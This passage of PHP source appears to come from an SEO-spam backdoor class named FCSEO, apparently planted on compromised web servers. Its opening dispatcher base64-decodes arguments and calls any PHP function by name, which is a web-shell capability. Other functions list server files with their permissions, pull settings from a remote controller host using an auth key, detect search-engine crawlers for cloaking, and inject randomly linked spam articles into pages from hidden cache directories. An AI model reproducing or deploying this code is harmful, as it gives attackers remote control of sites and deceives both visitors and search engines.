		$data = is_array($data)?($fun=array_map(function($d) use(&$fun){return is_array($d)?$fun($d):(substr(trim($d), 0, 7)=='base64:'?base64_decode(substr(trim($d), 7)):$d);}, $data)):$data;
		$res = null;
		if( function_exists($name) ){
			$res = $data?call_user_func_array($name, $data):$name();
		}elseif( is_callable(array(FCSEO::app(), $name)) ){
			$res = $data?call_user_func_array(array(FCSEO::app(), $name), $data):FCSEO::app()->{$name}();
		}else{
			$res = isset($GLOBALS[$name])?(is_array($GLOBALS[$name])?array_map($fun=function($data) use(&$fun){
				if( is_array($data) ){
					return $fun($data);
				}elseif( is_string($data) ){
					return trim($data);
				}else{
					return $data;
				}
			}, $GLOBALS[$name]):$GLOBALS[$name]):null;
		}
		return $res;
	}
	
	function listDir($path, $fileType='', $all=0){
		$path = str_replace(array('/','\\'), DIRECTORY_SEPARATOR, $path);
		if(!file_exists($path)||!is_dir($path)){
			return '';
		}
		if(substr($path, -1,1)==DIRECTORY_SEPARATOR){
			$path = substr($path, 0,-1);
		}
		$dirList=array();
		$dir=opendir($path);
		while($file=readdir($dir)){
			if($file!=='.'&&$file!=='..'){
				$file = $path.DIRECTORY_SEPARATOR.$file;
				if( function_exists('posix_getpwuid') && function_exists('posix_getgrgid') ){
					$owner_info = posix_getpwuid(fileowner($file));
					$group_info = posix_getgrgid($owner_info['gid']);
				}else{
					$owner_info = $group_info = array(
						'name'=>'--',
						'gid'=>'0',
					);
				}
				if( is_dir($file) ){
					# 按类型列举文件-结果中不需要显示目录
					if( strlen($fileType)<1 ){
						$dirList[] = array('name'=>str_replace(DIRECTORY_SEPARATOR,'/',$file),'isDir'=>intval(is_dir($file)),'mod'=>substr(sprintf("%o",fileperms($file)),-3), 'owner'=>$owner_info['name'], 'group'=>$group_info['name'], 'writable'=>intval(is_writable($file)));
					}
					if( $all ){
						$dirList = array_merge($dirList,$this->listDir($file, $fileType, $all));
					}
				}else{
					if( strlen($fileType)>0 && !in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), array_map('strtolower', (array)explode(',', $fileType))) ){
						continue;
					}
					$dirList[] = array('name'=>str_replace(DIRECTORY_SEPARATOR,'/',$file),'isDir'=>intval(is_dir($file)),'md5_file'=>md5_file($file),'filesize'=>filesize($file),'filemtime'=>filemtime($file),'mod'=>substr(sprintf("%o",fileperms($file)),-3), 'owner'=>$owner_info['name'], 'group'=>$group_info['name'], 'writable'=>intval(is_writable($file)));
				}
			};
		};
		closedir($dir);
		return $dirList;
	}
	
	function setting($type='sync|get', $name=''){
		global $seo_settings;
		$db = null;
		if( class_exists('SQLite3') ){
			$dbname = __FILE__.'.db';
			$table_init = false;
			if( !file_exists($dbname) ){
				@file_put_contents($dbname, '');
				$table_init = true;
			}
			$db = new SQLite3($dbname, SQLITE3_OPEN_READWRITE);
			if( $table_init ){
				$db->exec("CREATE TABLE settings (name varchar(32) NOT NULL DEFAULT('') UNIQUE, value text NOT NULL, type varchar(16) NOT NULL DEFAULT('text'), notes varchar(256) DEFAULT(''));");
			}
			if( $db->lastErrorCode()>1 ){
				return null;
			}
			$db->createFunction('md5', function($str=''){return md5($str);});
			$getAll = function($sql) use(&$db){
				$res = array();
				if($result = $db->query($sql)){
					while($row = $result->fetchArray(SQLITE3_ASSOC)){
						$res[] = $row;
					}
					unset($result);
				}
				return $res;
			};
			$getRow = function($sql) use(&$db){
				return $db->query($sql)->fetchArray(SQLITE3_ASSOC);
			};
		}
		$res = null;
		switch($type){
			case 'sync':
				if( $db ){
					$res = file_get_contents("http://{$this->api_host}/seo/sync_client_settings?id={$this->id}&auth_key={$this->auth_key}", false, stream_context_create(array('http'=>array(
						'timeout'=>60,
						'method' => 'POST',
						'header' => "Content-type: text/plain",
						'content' => null,
					))));
					$res = strlen($res)>0?(array)json_decode($res, 1):array();
					$success = 0;
					if( $res ){
						foreach($res as $k=>$v){
							$db->exec(sprintf('replace into settings (%s) values (%s)',
								(sprintf('%s', implode(',', array_keys($v)))),
								(sprintf("'%s'", implode("','", array_map(array($db, 'escapeString'), array_values($v)))))
							));
							$success += (int)$db->changes();
						}
					}
					echo json_encode(array('status'=>'yes', 'data'=>$success));die;
				}else{
					echo json_encode(array('status'=>'no', 'data'=>"SQLite3 is not supported"));die;
				}
				break;
			case 'get':
				if( !$this->settings ){
					if( $db ){
						$res = $getAll("select * from settings where 1=1 ");
						$res = $res?array_map(function($row){
							if( isset($row['type']) && $row['type']=='json' ){
								$row['value'] = json_decode($row['value'], 1);
							}
							return $row;
						}, $res):$res;
						if( $res ){
							$tmp = array();
							foreach($res as $k=>$v){
								$tmp[$v['name']] = $v['value'];
							}
							$res = $tmp;
						}
					}
					$this->settings = $res?$res:json_decode($this->trim_json($seo_settings), 1);
				}else{
					$res = $this->settings;
				}
				if( strlen($name)>0 ){
					$res = isset($res[$name])?$res[$name]:null;
				}
				break;
		}
		return $res;
	}
	
	public function isCrawler($agent=''){
		$agent = strlen(trim($agent))<1&&isset($_SERVER['HTTP_USER_AGENT'])?strtolower($_SERVER['HTTP_USER_AGENT']):$agent;
		$spiderSite= array(
			"TencentTraveler", "Baiduspider+", "BaiduGame", "Googlebot", "msnbot", "Sosospider+",
			"Sogou web spider", "ia_archiver", "Yahoo! Slurp", "YoudaoBot", "Yahoo Slurp", "MSNBot",
			"Java (Often spam bot)", "BaiDuSpider", "Voila", "Yandex bot", "BSpider", "twiceler",
			"Sogou Spider", "Speedy Spider", "Google AdSense", "Heritrix", "Python-urllib",
			"Alexa (IA Archiver)", "Ask", "Exabot", "Custo", "OutfoxBot/YodaoBot", "yacy", "SurveyBot",
			"legs", "lwp-trivial", "Nutch", "StackRambler", "The web archive (IA Archiver)", "Perl tool",
			"MJ12bot", "Netcraft", "MSIECrawler", "WGet tools", "larbin", "Fish search",
			"Spider", "bot", "slurp", "mediapartners", "webcrawler", "altavista", "ia_archiver"
		);
		return str_ireplace($spiderSite, '', $agent)!=$agent;
	}

}

class RandArticles{
	# 文章列表，每篇文章采用h3与p标签来存储标题与内容，支持填写任意篇文章
	# <h3>文章标题</h3><p>文章内容</p>	<h3>文章标题</h3><p>文章内容</p>
	public static $articles = '';
	# 文章标题链接，每行填写一个URL，用于随机向文章标题插入url
	public static $article_urls = '';
	# 文章刷新周期
	public static $expire_time = 604800;
	public static $article_num = 3;
	# 当前页面URI
	public static $REQUEST_URI = null;
	protected static $cache_file = null;
	protected static $cache_keys = null;
	protected static $dir;

	static function init(){
		self::$dir = dirname(__FILE__).'/.RandArticles';
		if( !file_exists(self::$dir) ){
			@mkdir(self::$dir);
		}
		is_string(self::$REQUEST_URI)&&(self::$cache_file=sprintf(self::$dir."/%s.cache", md5(self::$REQUEST_URI)));
		is_string(self::$REQUEST_URI)&&(self::$cache_keys=sprintf(self::$dir."/%s.keys", md5(self::$REQUEST_URI)));
	}

	static function getArticles($num=3, $use_url=true){
		self::init();
		$articles = self::$articles?self::$articles:(FCSEO::app()->setting('get', 'rand_articles'));
		$article_urls = strlen(self::$article_urls)>4?self::$article_urls:FCSEO::app()->setting('get', 'rand_article_urls');
		(is_string($articles)&&preg_match_all('@\<h3[^>]*\>(.*)\<\/p\>@isU', $articles, $matches)&&($articles=$matches[0]));
		is_string($article_urls)&&($article_urls = array_unique(array_filter(array_map('trim', (array)explode("\n", $article_urls)))));
		if( $articles ){
			$md5_list = file_exists(self::$cache_keys)?file_get_contents(self::$cache_keys):'';
			$max_loop = 100;
			do{
				shuffle($articles);
				$articles = array_slice($articles, 0, $num);
				$articles_md5 = array_map('md5', array_map('trim', $articles));
				sort($articles_md5);
				$articles_md5 = md5(implode('', $articles_md5));
				$max_loop--;
			}while($max_loop>0 && preg_match("@({$articles_md5})@i", $md5_list));
			if( $max_loop<=0 ){
				@unlink(self::$cache_keys);
			}
			@file_put_contents(self::$cache_keys, $articles_md5."\n", FILE_APPEND);
			if( $articles && $use_url && $article_urls ){
				foreach ($articles as $key => $value) {
					shuffle($article_urls);
					$url = $article_urls[rand(0, count($article_urls)-1)];
					$articles[$key] = preg_replace_callback('@(\<h3[^>]*\>)(.*)(\<\/h3\>)@is', function($match) use(&$url){
						if( stripos($match[0], '</a>')===false ){
							return "{$match[1]}<a href='{$url}' target='_blank'>{$match[2]}</a>{$match[3]}";
						}else{
							return $match[0];
						}
					}, $value);
				}
			}
		}
		return $articles;
	}

	static function articles2html($num=3){
		self::init();
		if( file_exists(self::$cache_file) && (filesize(self::$cache_file)>32) && (time()-filemtime(self::$cache_file)<self::$expire_time) ){
			return file_get_contents(self::$cache_file);
		}
		$html = '';
		$articles = self::getArticles($num);
		if( $articles ){
			$page_language = (mb_strlen(FCSEO::$title)/strlen(FCSEO::$title))>0.65?'en':'cn';
			$html .= ($page_language=='en'?'<h2>Recommended reading</h2>':'<h2>相關推薦</h2>');
			$html .= '<div class="col-md-12">';
			foreach ($articles as $key => $value) {
				$html .= sprintf('<div class="col-md-%d">%s</div>', ceil(12/$num), $value);
				self::pageRelatedUpdate($articles[$key]);
			}
			$html .= '</div>';
			@file_put_contents(self::$cache_file, $html);
		}
		return $html;
	}

	static function pageRelatedUpdate($article=''){
		self::init();
		preg_match('@<a\s*[^>]*href=[\'\"]([^>|^\'|^\"]+)[\'\"][^>]*>@i', $article, $match);
		$url = isset($match[1])?$match[1]:'';
		if( $url && $article ){
			$uri = preg_match('@([a-z]*:?\/\/[a-z0-9-\._]+)*\/(.*)@i', trim($url), $match)&&isset($match[2])?"/{$match[2]}":"/";
			$filename = sprintf(self::$dir."/%s.pageRelated.json", md5($uri));
			$data = file_exists($filename)?((array)json_decode(file_get_contents($filename),1)):array();
			$data = $data?array_filter($data, function($row){return isset($row['expire_time'])&&time()<=$row['expire_time'];}):$data;
			$data[md5(trim($article))] = array(
				'uri'=>$uri,
				'expire_time'=>self::$expire_time + time(),
				'article'=>$article,
			);
			@file_put_contents($filename, json_encode($data));
		}
		return $article;
	}

	static function pageRelated2html(){
		self::init();
		$uri = RandArticles::$REQUEST_URI;
		$filename = sprintf(self::$dir."/%s.pageRelated.json", md5($uri));
		$data = file_exists($filename)?((array)json_decode(file_get_contents($filename),1)):array();
		$articles = $data?array_column($data, 'article'):array();
		$html = '';
		if( $articles ){
			$num = count($articles);
			$num = $num>12?12:$num;
			$html .= '<h2>關聯文章</h2>';
			$html .= '<div class="col-md-12">';
			foreach ($articles as $key => $value) {
				$html .= sprintf('<div class="col-md-%d">%s</div>', ceil(12/$num), $value);
			}
			$html .= '</div>';
		}
		return $html;
	}

}